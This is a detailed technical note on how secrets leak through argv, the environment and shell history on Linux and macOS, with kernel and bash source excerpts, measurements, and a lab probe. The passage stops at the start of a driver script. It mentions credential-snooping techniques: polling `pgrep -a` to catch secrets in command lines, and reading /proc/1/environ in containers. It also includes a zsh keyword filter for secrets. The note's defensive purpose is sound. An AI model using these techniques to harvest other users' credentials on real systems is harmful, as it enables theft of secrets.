---
type: concept
track: [sde, distinguished]
level:
status: solid
last_reviewed:
sources:
  - "https://pubs.opengroup.org/onlinepubs/9799919799/functions/exec.html"
  - "https://pubs.opengroup.org/onlinepubs/9799919799/functions/environ.html"
  - "https://pubs.opengroup.org/onlinepubs/9799919799/basedefs/V1_chap08.html"
  - "https://pubs.opengroup.org/onlinepubs/9799919799/utilities/V3_chap02.html"
  - "https://pubs.opengroup.org/onlinepubs/9799919799/utilities/fc.html"
  - "https://pubs.opengroup.org/onlinepubs/9799919799/basedefs/limits.h.html"
  - "https://raw.githubusercontent.com/torvalds/linux/master/fs/proc/base.c"
  - "https://raw.githubusercontent.com/torvalds/linux/master/fs/binfmt_elf.c"
  - "https://raw.githubusercontent.com/mfragkoulis/bash/master/bashhist.c"
  - "https://raw.githubusercontent.com/mfragkoulis/bash/master/subst.c"
  - "https://raw.githubusercontent.com/mfragkoulis/bash/master/redir.c"
  - "https://cwe.mitre.org/data/definitions/214.html"
  - "https://nvd.nist.gov/vuln/detail/CVE-2021-32638"
  - "https://about.codecov.io/security-update/"
  - "https://github.com/github/codeql-action/security/advisories/GHSA-g36v-2xff-pv5m"
  - "https://raw.githubusercontent.com/torvalds/linux/master/kernel/sys.c"
  - "https://docs.kernel.org/filesystems/proc.html"
  - "https://man7.org/linux/man-pages/man2/memfd_create.2.html"
  - "https://man7.org/linux/man-pages/man8/pam_tty_audit.8.html"
  - "https://ftp.gnu.org/gnu/bash/bash-5.1.tar.gz"
  - "https://raw.githubusercontent.com/torvalds/linux/master/fs/exec.c"
  - "https://raw.githubusercontent.com/torvalds/linux/master/include/uapi/linux/binfmts.h"
  - "https://raw.githubusercontent.com/torvalds/linux/master/include/uapi/linux/limits.h"
  - "https://zsh.sourceforge.io/Doc/Release/Functions.html"
  - "https://zsh.sourceforge.io/Doc/Release/Parameters.html"
---

# Secrets in argv, the Environment, and History

> [!summary] Claim
> Passing secrets through `argv` or exported environment variables exposes them to global process listings, audit logs, and inherited child subshells, while interactive history records them permanently to disk; production systems must transmit credentials over private streams such as standard input, dedicated file descriptors, or sealed memory-backed buffers.

Part of [Shell Security](README.md) in [Shell and Unix Engineering](../README.md).

## TL;DR

- Mechanism: `argv` resides on the process stack and is world-readable via `/proc/[pid]/cmdline` on Linux (and via the setuid-root `/bin/ps` on macOS), `environ` is inherited across every child `execve` and readable via `/proc/[pid]/environ`, and shells append interactive commands directly to `$HISTFILE`.
- Rule: deliver secrets over private streams using pipes (`--password-stdin`), dedicated file descriptors (`3<`), or restricted configuration files (`chmod 0600`), and scrub inheritance boundaries using `env -i`.
- Trap: `HISTCONTROL=ignorespace` only suppresses lines starting with an ASCII space (0x20), meaning tabs, history expansions, missing spaces, and multi-line compound constructs still leak secrets to disk.
- Portability fact: Bash 3.2, zsh, ksh93, mksh, and posh back here-documents with regular files (unlinked in `$TMPDIR` for bash and zsh, in `/dev/shm` for ksh93u+m, still linked in `/tmp` while the command runs for mksh and posh), whereas dash and BusyBox ash always use pipes and Bash 5.1+ and yash use a pipe only for small payloads (measured in the shell matrix, as of 2026-11).
- When not to use it: do not attempt to mask credentials by overwriting `argv[0]` in user space, because the kernel exposes a race window between `execve` and the in-process wipe where `/proc/[pid]/cmdline` and audit daemons capture the plaintext.

## Mental model

```mermaid
flowchart TD
  subgraph Input["Input Boundary"]
    A["CLI Invocation<br/>tool --token SECRET"]
    B["Environment Export<br/>export API_KEY=SECRET"]
    C["Interactive Shell<br/>prompt &gt; tool SECRET"]
    D["Private Stream<br/>printf '%s' SECRET | tool --stdin"]
  end

  subgraph Kernel["Kernel &amp; Process State"]
    E["Process Stack<br/>mm-&gt;arg_start to mm-&gt;arg_end"]
    F["Process Environment<br/>mm-&gt;env_start to mm-&gt;env_end"]
    G["Shell Memory<br/>History list &amp; $HISTFILE"]
    H["Kernel Pipe Buffer<br/>Unopened Anonymous Pipe"]
  end

  subgraph Leak["Exposure Surfaces"]
    I["World-Readable<br/>/proc/[pid]/cmdline &amp; ps aux"]
    J["Audit Logs<br/>auditd type=EXECVE"]
    K["UID-Readable<br/>/proc/[pid]/environ &amp; Children"]
    L["Persistent Storage<br/>~/.bash_history &amp; Disk Blocks"]
    M["Private Delivery<br/>Read Once by Callee"]
  end

  A --> E
  B --> F
  C --> G
  D --> H

  E --> I
  E --> J
  F --> K
  G --> L
  H --> M
```

An invocation that places sensitive parameters into `argv` transfers those bytes directly to the initial process stack frame during the `execve` system call.
On Linux, the kernel exposes this initial argument page globally through the virtual filesystem interface `/proc/[pid]/cmdline` with mode `0444`, allowing any concurrent local process on the operating system to poll the plaintext value without privileges.
Similarly, exporting a credential to the shell environment populates `environ`, which the kernel preserves across every subsequent `fork` and `execve` boundary unless explicitly scrubbed, handing credentials downstream to every invoked build tool, compiler, and monitoring script.
Interactive command lines fall into the shell history subsystem, which formats and appends them to disk in `$HISTFILE` where they survive session termination, system reboots, and backup extraction.
By contrast, streaming credentials through anonymous kernel pipes or dedicated file descriptors connects the caller and callee through private memory buffers that never surface in global process tables, audit daemon records, or persistent history logs.

## How it works

### The anatomy of an exec: stack layout and process memory

The Unix process execution boundary is governed by the `execve` system call (POSIX.1-2024 functions/exec.html):
```c
int execve(const char *pathname, char *const argv[], char *const envp[]);
```

When a shell executes an external command, it forks a child process and calls `execve`.
The operating system kernel validates the executable image and sets up a fresh virtual address space.
In Linux, `fs/exec.c` copies the executable pathname, then the environment strings, then the argument strings to the top of the new user stack, and the ELF loader (`fs/binfmt_elf.c`, `create_elf_tables`) then builds the pointer arrays and auxiliary vector below them:

```text
+-------------------------------------------------------+ High Memory
| End marker and executable pathname (bprm->filename)   |
| Environment string contents ("KEY=VALUE\0", ...)      |
| Argument string contents ("argv[0]\0", "argv[1]\0"...) |
| Platform strings and AT_RANDOM bytes, padding         |
+-------------------------------------------------------+
| Auxiliary vector (type/value pairs, ending AT_NULL)   |
| Environment pointers (envp[0] .. envp[n-1], NULL)     |
| Argument pointers (argv[0] .. argv[argc-1], NULL)     |
| Argument count (argc)                                 |
+-------------------------------------------------------+ Low Memory (Initial Stack Pointer %esp / %rsp)
```

The memory descriptor structure `struct mm_struct` records the boundaries of these string regions:
- `mm->arg_start`: base address of the argument strings on the stack.
- `mm->arg_end`: address immediately following the terminating null byte of the last argument.
- `mm->env_start`: base address of the environment strings.
- `mm->env_end`: address immediately following the terminating null byte of the last environment string.

`create_elf_tables` sets `arg_end`, `env_start`, and `env_end` without taking `mm->arg_lock` (the process is not yet running); readers such as `get_mm_cmdline` and writers such as `prctl(PR_SET_MM)` take `spin_lock(&mm->arg_lock)` later ([fs/binfmt_elf.c](https://raw.githubusercontent.com/torvalds/linux/master/fs/binfmt_elf.c), [kernel/sys.c](https://raw.githubusercontent.com/torvalds/linux/master/kernel/sys.c)).
Because the operating system expects utilities to parse their options from `argv`, placing a secret into `argv` places that secret into user stack memory before the program executes its first instruction.

### `argv` exposure: `/proc/[pid]/cmdline`, `ps`, and process title rewriting

On Linux, `/proc` is a pseudo-filesystem that exposes kernel data structures as files.
Each active process has an entry at `/proc/[pid]/cmdline`.
The file operations for `/proc/[pid]/cmdline` are defined in `fs/proc/base.c` (simplified excerpt; upstream also has a `BUG_ON(*pos < 0)` guard):
```c
static ssize_t proc_pid_cmdline_read(struct file *file, char __user *buf,
                                     size_t count, loff_t *pos)
{
    struct task_struct *tsk;
    ssize_t ret;
    tsk = get_proc_task(file_inode(file));
    if (!tsk) return -ESRCH;
    ret = get_task_cmdline(tsk, buf, count, pos);
    put_task_struct(tsk);
    if (ret > 0) *pos += ret;
    return ret;
}
```

The helper function `get_mm_cmdline(mm, buf, count, ppos)` accesses the memory descriptor of the process and reads the bytes between `mm->arg_start` and `mm->arg_end`.
In `fs/proc/base.c`, the proc entry for `cmdline` is registered as:
```c
REG("cmdline", S_IRUGO, proc_pid_cmdline_ops),
```
`S_IRUGO` corresponds to octal permissions `0444` (read permission for User, Group, and Others).
Unlike `/proc/[pid]/environ` or `/proc/[pid]/mem`, reading `/proc/[pid]/cmdline` does not call `__mem_open` and does not check `ptrace_may_access`.
Any unprivileged user or process running on the system can read the complete command line of any other process on the host by opening `/proc/[pid]/cmdline`.
Process listing utilities such as `ps aux`, `top`, `htop`, `pgrep -a`, and `pidof` function by reading `/proc/[pid]/cmdline`.

The only kernel-level mitigation that limits `/proc/[pid]/cmdline` visibility to unprivileged users is mounting `/proc` with the `hidepid` option:
- `hidepid=off` (0): default mode; all process directories are accessible and readable by all users.
- `hidepid=noaccess` (1): users may not access any `/proc/[pid]` directories but their own; the directories of other users stay listed, but their contents (including `cmdline`) are unreadable.
- `hidepid=invisible` (2): `noaccess` plus other users' process directories are completely hidden from `/proc` directory listings.
- `hidepid=ptraceable` (4): procfs contains only the `/proc/[pid]` directories that the caller can ptrace ([kernel procfs documentation](https://docs.kernel.org/filesystems/proc.html)).
- The `gid=` mount option exempts one group (for example a monitoring group) from these restrictions.

On macOS and BSD derivatives, `/proc` is absent by default.
Instead, process arguments are inspected via the `sysctl` interface using `CTL_KERN` and `KERN_PROCARGS2` (`sys/sysctl.h`).
The kernel copies the arguments from process memory into a user-supplied buffer.
On macOS, an unprivileged caller can read the `KERN_PROCARGS2` buffer of its own processes; reading arguments belonging to other UIDs requires root.
That is not a confidentiality boundary in practice: `/bin/ps` is installed setuid root (`-rwsr-xr-x root wheel`), so any local user running `ps -axo user,args` sees the full argument lists of root and other users' processes (measured on the macOS host, as of 2026-11).

Many programs attempt to hide secrets passed in `argv` by overwriting the memory in `main()`:
```c
int main(int argc, char *argv[]) {
    if (argc > 1) {
        memset(argv[1], 'x', strlen(argv[1]));
    }
}
```
This defense contains a fatal race condition.
The kernel makes `argv` visible the instant `execve` succeeds and the process becomes visible in the process table.
There is a measurable window of time between `execve`, dynamic linker resolution (`ld.so`), C runtime initialization (`crt1.o`), and the invocation of `main()`.
Any watcher running a simple loop (`while true; do pgrep -a mytool; done`) or an eBPF tracepoint captures the secret during this startup window.
Furthermore, the Linux Audit subsystem (`auditd`) logs `execve` arguments at the system call boundary:
```text
type=EXECVE msg=audit(1700000000.123:456): argc=2 a0="mytool" a1="--token=SECRET_VALUE"
```
Once `auditd` records an `execve` event, the plaintext secret is permanently written to `/var/log/audit/audit.log` regardless of whether user space later zeroes `argv`.

Linux provides `prctl(PR_SET_NAME, ...)` to rename the process, but this modifies only `task->comm` (capped at `TASK_COMM_LEN` = 16 bytes), which changes `/proc/[pid]/comm` and `ps -c`, leaving `/proc/[pid]/cmdline` untouched.
To safely rewrite `mm->arg_start` and `mm->arg_end`, Linux requires `prctl(PR_SET_MM, PR_SET_MM_ARG_START/END, ...)`, which `prctl_set_mm` gates on `capable(CAP_SYS_RESOURCE)`; the `CAP_CHECKPOINT_RESTORE` capability added in Linux 5.9 applies only to replacing the executable file through `PR_SET_MM_MAP` (`checkpoint_restore_ns_capable` in [kernel/sys.c](https://raw.githubusercontent.com/torvalds/linux/master/kernel/sys.c)).

### Environment exposure: `/proc/[pid]/environ`, process inheritance, and container leak paths

The process environment is passed to `execve` as `char *const envp[]`.
In Linux `fs/proc/base.c`, the `/proc/[pid]/environ` pseudo-file is registered with restricted permissions:
```c
REG("environ", S_IRUSR, proc_environ_operations),
```
`S_IRUSR` grants read permission only to the process owner (mode `0400`).
Furthermore, opening `/proc/[pid]/environ` invokes `environ_open`, which enforces `__mem_open(inode, file, PTRACE_MODE_READ)`:
```c
static int environ_open(struct inode *inode, struct file *file)
{
    return __mem_open(inode, file, PTRACE_MODE_READ);
}
```
This requires that the inspecting process possesses `ptrace` read permissions over the target process.
While this prevents other non-root UIDs from reading `/proc/[pid]/environ`, it offers no protection against processes running under the same UID.
Any background job, cron job, or peer process executing as the same user can open and read `/proc/[pid]/environ`.

The primary failure mode of environment variables is uncontrolled inheritance across execution boundaries.
POSIX defines shell environment inheritance in the Shell Execution Environment specification (POSIX.1-2024 XCU 2.13, [V3_chap02](https://pubs.opengroup.org/onlinepubs/9799919799/utilities/V3_chap02.html)):
When an external utility is invoked, it inherits the shell variables exported by the `export` utility, plus any explicit variable assignments preceding the command.
Consider a script that sets a credential for one command:
```sh
export DATABASE_URL="postgres://user:password@db.internal/prod"
run_migrations
grep "pattern" /var/log/app.log
curl https://example.com/health
```
Because `DATABASE_URL` was exported, it remains present in the environment for every command executed afterwards.
Both `grep` and `curl` inherit `DATABASE_URL` in their `environ` arrays.
If `curl` crashes and generates a core dump, or if an invoked build tool executes a third-party plugin, that third-party code reads `DATABASE_URL` directly from its own `environ`.

POSIX provides simple command prefix assignment (POSIX.1-2024 XCU 2.9.1.2 Variable Assignments, [V3_chap02](https://pubs.opengroup.org/onlinepubs/9799919799/utilities/V3_chap02.html)):
```sh
DATABASE_URL="postgres://user:password@db.internal/prod" run_migrations
```
When `run_migrations` is an external utility, this syntax exports `DATABASE_URL` only into the execution environment of `run_migrations`, without exporting it into the parent shell environment.
The scoping does not hold for every command type.
POSIX requires an assignment before a special built-in (such as `eval` or `.`) to "remain in effect when the command completes".
Before a shell function that is not a standard utility, the assignments affect the current execution environment during the call, and it is unspecified whether they persist after the call and whether they gain the export attribute (all from XCU 2.9.1.2).
However, `run_migrations` itself passes that environment to every child process it spawns.

In containerized and orchestrated environments, environment variables present systemic risks:
1. `docker inspect <container_id>` displays all environment variables configured via `docker run -e` or Dockerfile `ENV` in cleartext JSON.
2. In Kubernetes, defining sensitive environment variables as literal `value:` entries in `spec.containers[*].env` makes them visible to anyone with `get pods` or `describe pods` permissions; `valueFrom.secretKeyRef` puts only the reference in the pod spec, but the value still lands in the container's `environ`.
3. Inside a container namespace, `/proc/1/environ` contains the boot-time environment variables of the container init process.
If all container processes share the same UID (for example UID 1000), any unprivileged process inside that container can read `/proc/1/environ` and extract the container secrets.
4. Application monitoring frameworks and exception handlers (such as Sentry, bug trackers, and web framework debuggers) often dump `os.environ` upon unhandled exceptions, writing database passwords and API tokens directly into centralized error logs.

### Shell history exposure: `HISTFILE`, `HISTCONTROL`, multi-line traps, and terminal logging

Interactive shells record commands into an in-memory history list and serialize them to disk upon shell termination.
POSIX standardizes history manipulation through the `fc` utility (POSIX.1-2024 utilities/fc.html).
POSIX specifies that if `HISTFILE` is unset, the shell may access or create `.sh_history` in the directory named by `HOME`.
The number of retained commands is bounded by `HISTSIZE`; if it is unset, POSIX requires "an unspecified default greater than or equal to 128" ([fc](https://pubs.opengroup.org/onlinepubs/9799919799/utilities/fc.html)).

GNU Bash implements history processing in `bashhist.c`.
When a command is entered, Bash invokes `maybe_add_history(char *line)` (excerpt from the older Bash source mirror listed in `sources:`; current Bash adds comment tracking around the same logic, and the behavior below was re-measured on Bash 5.2.37):
```c
void maybe_add_history (line)
     char *line;
{
  hist_last_line_added = 0;
  if (current_command_line_count > 1)
    {
      if (current_command_first_line_saved &&
          ((parser_state & PST_HEREDOC) || literal_history || dstack.delimiter_depth != 0 || shell_comment (line) == 0))
        bash_add_history (line);
      return;
    }
  current_command_first_line_saved = check_add_history (line, 0);
}
```

The function `check_history_control(char *line)` checks `HISTCONTROL`:
```c
static int check_history_control (line)
     char *line;
{
  if (history_control == 0)
    return 1;
  if ((history_control & HC_IGNSPACE) && *line == ' ')
    return 0;
  ...
}
```

This implementation reveals three critical traps:
1. Exact Space Check: `*line == ' '` tests exclusively for a literal ASCII space (byte 0x20).
If an engineer indents a command with a tab character (`\t`, 0x09), `HC_IGNSPACE` evaluates to false, and the secret is written to history.
At a readline prompt Tab is bound to completion, so a leading tab usually arrives through a paste or a script fed to `bash -i`; when Bash 5.2.37 read a tab-indented line that way, it saved the line to the history file without the leading tab (measured in the shell matrix).
2. The Multi-Line Trap: When a compound command spans multiple lines (such as a `{ ... }` block, an `if` statement, or a function definition), `maybe_add_history` evaluates `check_add_history` only on the first line (`current_command_line_count == 1`).
If the first line did not begin with a space, `current_command_first_line_saved` is set to 1.
Subsequent lines of the block are then automatically saved by `bash_add_history (line)` regardless of whether those subsequent lines begin with a space.
With the default `cmdhist` option, Bash joins those lines into one history entry, so a space-indented secret on line two is saved as part of `{   echo "gamma"; }`-style entries (measured on Bash 5.2.37).
3. History Expansion: In interactive shells where history expansion is active (`set -H` / `set -o histexpand`), Bash performs `!` expansion on the line before it is saved and executed, so a secret containing `!` inside double quotes is silently rewritten or rejected with `event not found`, and the retyped line is subject to the same history rules as any other; quote such secrets with single quotes or run `set +H`.

In zsh, history options include `setopt hist_ignore_space`, `setopt hist_no_store` (removes the `history` or `fc -l` command itself from the history list), the `HISTORY_IGNORE` parameter (a pattern applied when history files are written, [zsh Parameters](https://zsh.sourceforge.io/Doc/Release/Parameters.html)), and the `zshaddhistory` hook function.
The `zshaddhistory` hook runs before any interactive line is saved:
```zsh
zshaddhistory() {
  emulate -L zsh
  if [[ "$1" =~ (SECRET|TOKEN|PASSWORD|PRIVATE_KEY) ]]; then
    return 1
  fi
  return 0
}
```
Returning 1 aborts saving to the history list, although the line lingers in the history until the next line is executed; returning 2 saves to internal memory but prevents writing to `$HISTFILE` ([zsh hook functions](https://zsh.sourceforge.io/Doc/Release/Functions.html)).

Beyond shell history files, terminal emulators and session managers log interactive commands:
- Terminal multiplexers (`tmux`, `screen`) maintain scrollback buffers that retain cleartext passwords until the pane buffer is cleared.
- Session recorders (`script`, asciinema) capture every keystroke and byte emitted to `/dev/tty`.
- Linux auditing daemons configured with `pam_tty_audit` record raw tty keystrokes to `/var/log/audit/audit.log`; keystrokes typed while echo is off (`stty -echo`, the password-prompt mode) are logged only with the `log_passwd` option ("By default, passwords are not logged"), but a password typed into a nested session such as `ssh` from an audited tty can still be captured ([pam_tty_audit(8)](https://man7.org/linux/man-pages/man8/pam_tty_audit.8.html)).

### Safe transmission channels: file descriptors, pipes, process substitution, and `memfd_create`

To deliver credentials safely on Unix systems, the data must travel over private inter-process communication channels.

#### 1. Standard Input and Anonymous Pipes
The standard pattern for secret delivery is standard input over an anonymous pipe:
```sh
printf '%s' "$SECRET" | tool --password-stdin
```
The shell creates an anonymous pipe via `pipe(2)`.
The pipe buffer exists purely in kernel memory.
The credential bytes flow directly from the stdout of `printf` to the stdin of `tool`.
The secret does not appear in `argv`, is absent from `/proc/[pid]/cmdline`, and leaves no trace in audit logs.

#### 2. Dedicated File Descriptors
When a utility accepts a file descriptor argument, the secret can be attached to an alternate file descriptor:
```sh
tool --token-fd 3 3< /path/to/protected/token
```
Here, `argv` contains only `--token-fd 3`.
The credential is read directly from file descriptor 3.
The caller can clear the file descriptor immediately after the child starts.

#### 3. Process Substitution
Process substitution `<(command)` allows delivering streamed data to utilities that expect a filesystem path:
```sh
tool --config <(printf '%s\n' "$SECRET_CONFIG")
```
In GNU Bash (`subst.c`, `process_substitute`), on systems supporting `/dev/fd`, Bash executes `pipe(fildes)`, moves the parent read descriptor to a high file descriptor (such as fd 63), and expands the construct to `/dev/fd/63`.
The child process opens `/dev/fd/63` and reads the secret stream.
However, process substitution carries two caveats:
- On Linux, `/dev/fd/63` maps to `/proc/self/fd/63` (zsh skips the indirection and expands `<(cmd)` to `/proc/self/fd/10` on Linux, `/dev/fd/11` on macOS; measured in the shell matrix).
Another process owned by the same UID can attempt to reopen `/proc/[pid]/fd/63` before the child finishes reading.
- On legacy systems without `/dev/fd`, Bash falls back to `make_named_pipe()`, creating a named FIFO in `$TMPDIR` with mode `0600` (`make_named_pipe` calls `sh_mktmpname("sh-np", ...)` and then `mkfifo (tname, 0600)` in the `subst.c` mirror listed in `sources:`).

#### 4. Here-Documents and Temporary File Fallbacks
A widespread assumption is that here-documents (`<<EOF`) and here-strings (`<<<"$SECRET"`) are always memory-only streams.
In GNU Bash source code (`redir.c`, `here_document_to_fd`):
In Bash versions 5.0 and older (including the default `/bin/bash` 3.2 on macOS), Bash implements here-documents and here-strings by writing the payload out to a temporary file via `sh_mktmpfd("sh-thd", ...)` in `$TMPDIR`, opening the file read-only, and then unlinking it.
If `$TMPDIR` resides on a physical disk rather than `tmpfs`, the plaintext secret is physically written to disk blocks.
Starting in Bash 5.1, Bash optimizes small here-documents by buffering them in an anonymous pipe; however, if the payload exceeds the pipe buffer size, Bash falls back to writing a temporary file to disk.
The Bash 5.1 NEWS file (item 1.c) states: "Here documents and here strings now use pipes for the expanded document if it's smaller than the pipe buffer size, reverting to temporary files if it's larger", and `here_document_to_fd` in the 5.1 `redir.c` implements it by comparing the document length with the build-time `HEREDOC_PIPESIZE` and, where `F_GETPIPE_SZ` exists, with the pipe's real capacity before falling back to `sh_mktmpfd("sh-thd", ...)` ([bash-5.1 release tarball](https://ftp.gnu.org/gnu/bash/bash-5.1.tar.gz)).
In the shell matrix, a 65536-byte document still used a pipe and a 65537-byte document used `/tmp/sh-thd.XXXXXX (deleted)` on Debian Bash 5.2.37, and Bash 5.3.15 on the macOS host showed the same 64 KiB cutoff even though macOS pipes start at 16 KiB of buffer.
By contrast, dash and BusyBox ash implement here-documents entirely using memory pipes at every size measured (up to 70000 bytes).
Other shells differ again: zsh writes an unlinked temp file in `/tmp`, ksh93u+m writes an unlinked file in `/dev/shm` (memory-backed on Linux), mksh and posh leave a still-linked file in `/tmp` while the command runs, and yash used a pipe for a 7-byte document but a temp file for documents of 16 KiB and larger.

#### 5. Linux `memfd_create` and Kernel Keyrings
For maximum isolation on modern Linux systems, tools should employ `memfd_create(2)` or the kernel keyring:
- `memfd_create("secret_buffer", MFD_ALLOW_SEALING)`: creates an anonymous, RAM-backed file descriptor that has no inode on physical storage and cannot be linked into the filesystem hierarchy.
`MFD_ALLOW_SEALING` is required for sealing: without it the initial seal set is `F_SEAL_SEAL`, "meaning that no other seals can be set on the file" ([memfd_create(2)](https://man7.org/linux/man-pages/man2/memfd_create.2.html)).
The file descriptor can then be sealed with `fcntl(fd, F_ADD_SEALS, F_SEAL_WRITE | F_SEAL_SHRINK | F_SEAL_GROW | F_SEAL_SEAL)` to prevent modification before passing it to a child process, which reads it as an inherited descriptor or via `/proc/self/fd/<fd>`; add `MFD_CLOEXEC` only if the descriptor must not survive `execve`.
- Linux Kernel Keyrings (`keyctl`, `add_key(2)`, `request_key(2)`): store credentials directly within kernel memory structures protected by per-key permission masks (possessor, user, group, other).
Secrets in the session keyring (`KEY_SPEC_SESSION_KEYRING`) are released when the last process holding that session keyring exits, and are never exposed to filesystem storage or process argument buffers.

## Numbers and limits

| Parameter / Limit | Bound / Value | Scope / Level | Source / Verification |
|---|---|---|---|
| `_POSIX_ARG_MAX` | 4096 bytes | Standard minimum `argv` + `envp` size | (POSIX.1-2024 `<limits.h>`) |
| Linux `MAX_ARG_STRLEN` | 131072 bytes (128 KiB) on 4 KiB-page systems | Maximum length of a single `argv` or `envp` string (`PAGE_SIZE * 32`, so it scales with the page size) | Linux kernel `include/uapi/linux/binfmts.h` |
| Linux effective `argv` + `envp` limit | 2097152 bytes (2 MiB) with the default 8 MiB `RLIMIT_STACK` | `min(_STK_LIM / 4 * 3, RLIMIT_STACK / 4)`, raised to at least `ARG_MAX`, minus the space of the pointer arrays | `bprm_stack_limits` in Linux kernel `fs/exec.c` (`_STK_LIM` is 8 MiB in `include/uapi/linux/resource.h`) |
| Linux `ARG_MAX` constant | 131072 bytes (128 KiB) | Historical floor of the limit above, not the limit itself | Linux kernel `include/uapi/linux/limits.h` |
| macOS `kern.argmax` | 1048576 bytes (1 MiB) | Maximum combined argument and environment limit | Measured on macOS host via `sysctl kern.argmax` (as of 2026-11) |
| Linux `/proc/[pid]/cmdline` mode | `0444` (`S_IRUGO`) | World-readable; visible to any local user | Linux kernel `fs/proc/base.c` |
| Linux `/proc/[pid]/environ` mode | `0400` (`S_IRUSR`) | Owner-only; gated by `PTRACE_MODE_READ` check | Linux kernel `fs/proc/base.c` |
| Linux `TASK_COMM_LEN` | 16 bytes | Process name (`comm`) limit including null terminator | Linux kernel `include/linux/sched.h` |
| macOS `MAXCOMLEN` | 16 characters | Process name limit excluding the null terminator (`p_comm` is `char[MAXCOMLEN + 1]`) | macOS SDK `<sys/param.h>`, `<sys/proc.h>` (as of 2026-11) |
| Bash default `HISTSIZE` | 500 lines | In-memory interactive command history capacity; Debian's `/etc/skel/.bashrc` overrides it to 1000 | Measured with `bash --norc -i` on Bash 3.2.57 and 5.2.37 (as of 2026-11) |
| Bash default `HISTFILESIZE` | Value of `HISTSIZE` (500 lines) | On-disk interactive command history capacity; Debian's `/etc/skel/.bashrc` overrides it to 2000 | Measured with `bash --norc -i` on Bash 3.2.57 and 5.2.37 (as of 2026-11) |
| POSIX minimum `HISTSIZE` | 128 lines | Minimum default when `HISTSIZE` is unset, required by POSIX `fc` | (POSIX.1-2024 `utilities/fc.html`) |
| Bash heredoc pipe capacity cutoff | 65536 bytes (64 KiB) | Largest document Bash 5.1+ still sends through a pipe; 65537 bytes falls back to a temporary file | Measured in the shell matrix on Debian Bash 5.2.37 and macOS Bash 5.3.15 (as of 2026-11) |
| macOS pipe buffer | 16384 bytes initial, grows to 65536 | Kernel pipe buffer on macOS; does not lower the Bash heredoc cutoff | Measured on macOS host (as of 2026-11) |

## Portability

| Feature / Behavior | POSIX sh | macOS bash 3.2 | Current bash (5.3) | zsh (native) | dash | ksh93 | mksh | yash | BusyBox ash |
|---|---|---|---|---|---|---|---|---|---|
| `HISTCONTROL=ignorespace` | No (unspecified) | Yes (`0x20` space only) | Yes (`0x20` space only) | No (uses `hist_ignore_space`) | No | No | No | No | No |
| `HISTIGNORE` pattern filtering | No | Yes | Yes | No (`HISTORY_IGNORE` pattern or `zshaddhistory`) | No | No | No | No | No |
| History toggle `set [+-]o history` | No | Yes | Yes | No (`no such option`) | No | No (`unknown option`) | No (`unknown option`) | No (`not a valid option`) | No (`illegal option`) |
| Process substitution `<(cmd)` | No | Yes (`/dev/fd/63` or FIFO) | Yes (`/dev/fd/63` or FIFO) | Yes (`/proc/self/fd/10` on Linux, `/dev/fd/11` on macOS) | No | Yes (`/dev/fd/3`) | No | Redirection only (not substitution) | Yes in 1.37.0 (`/dev/fd/64`) |
| Heredoc backing (small payload) | Unspecified | `REGULAR_FILE` (temp file) | `PIPE_OR_FIFO` (memory pipe) | `REGULAR_FILE` (temp file) | `PIPE_OR_FIFO` | `REGULAR_FILE` (`/dev/shm` on ksh93u+m, temp file on macOS ksh93u+) | `REGULAR_FILE` (linked `/tmp` file) | `PIPE_OR_FIFO` (7 bytes) | `PIPE_OR_FIFO` |
| Heredoc backing (payload > 64 KiB) | Unspecified | `REGULAR_FILE` (temp file) | `REGULAR_FILE` (temp file) | `REGULAR_FILE` (temp file) | `PIPE_OR_FIFO` | `REGULAR_FILE` | `REGULAR_FILE` (linked `/tmp` file) | `REGULAR_FILE` (from 16 KiB) | `PIPE_OR_FIFO` |
| `exec -a <name>` (custom `argv[0]`) | No | Yes | Yes | Yes | No | Yes | Yes | Yes | Yes |
| Prefix assignment scoping `VAR=val cmd` (external utility) | Scoped to callee (POSIX 2.9.1.2) | Scoped to callee | Scoped to callee | Scoped to callee | Scoped to callee | Scoped to callee | Scoped to callee | Scoped to callee | Scoped to callee |

The history-toggle, process-substitution, heredoc-backing, and `exec -a` cells were measured in the shell matrix (Debian 13, Alpine 3.22, and the macOS host, as of 2026-11): heredoc backing with `readlink /proc/self/fd/0` at 7, 16383, 65535, 65536, and 70000 bytes, and history with `set -o history` under each shell.
The lab's here-document test asserts the measured small-payload value for every shell in the table: a pipe for dash, yash, and BusyBox ash, a regular file for zsh, ksh93, mksh, and posh, and for bash a regular file before 5.1 and a pipe from 5.1.
Its `set -o history` test asserts that only bash accepts the option, and its history test feeds an interactive `bash -i` the same lines as the predict-the-output question and asserts that the space-led line is absent while the tab-led, plain, and block lines are present in the history file.
The lab's seven tests ran once on the macOS host under `/bin/sh` (Bash 3.2.57); the other shells' assertions rest on the matrix measurements above and were not re-run for this revision.

## Worked example

The test lab [lab](../labs/17-secrets-in-argv-env-and-history/) proves the transmission differences between command-line arguments, environment inheritance, standard input streams, and here-document storage.

The lab probe `probe_channel.c` compiles to a native C binary that inspects its execution arguments, environment variables, and file descriptor properties:

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/stat.h>
#include <unistd.h>

int main(int argc, char *argv[]) {
  if (argc < 2) {
    fprintf(stderr, "usage: probe_channel <mode> [args...]\n");
    return 1;
  }

  if (strcmp(argv[1], "argv_check") == 0) {
    if (argc < 3) {
      return 1;
    }
    const char *needle = argv[2];
    int found = 0;
    for (int i = 3; i < argc; i++) {
      if (strstr(argv[i], needle) != NULL) {
        found = 1;
        break;
      }
    }
    if (found) {
      printf("found in argv\n");
    } else {
      printf("not in argv\n");
    }
    return 0;
  }

  if (strcmp(argv[1], "env_check") == 0) {
    if (argc < 3) {
      return 1;
    }
    const char *val = getenv(argv[2]);
    if (val != NULL) {
      printf("env: %s\n", val);
    } else {
      printf("env: unset\n");
    }
    return 0;
  }

  if (strcmp(argv[1], "stdin_type") == 0) {
    struct stat st;
    if (fstat(0, &st) < 0) {
      perror("fstat");
      return 1;
    }
    if (S_ISREG(st.st_mode)) {
      printf("REGULAR_FILE size=%lld\n", (long long)st.st_size);
    } else if (S_ISFIFO(st.st_mode)) {
      printf("PIPE_OR_FIFO\n");
    } else {
      printf("OTHER mode=0%o\n", (unsigned int)st.st_mode);
    }
    return 0;
  }

  if (strcmp(argv[1], "stdin_read") == 0) {
    char buf[128];
    ssize_t n = read(0, buf, sizeof(buf) - 1);
    if (n < 0) {
      perror("read");
      return 1;
    }
    buf[n] = '\0';
    printf("stdin: %s\n", buf);
    return 0;
  }

  fprintf(stderr, "unknown mode: %s\n", argv[1]);
  return 1;
}
```

The driver script `secrets_demo.sh` executes the probe under each transmission mode (excerpt; the lab file also carries a usage comment block after the header line):

```sh
#!/bin/sh
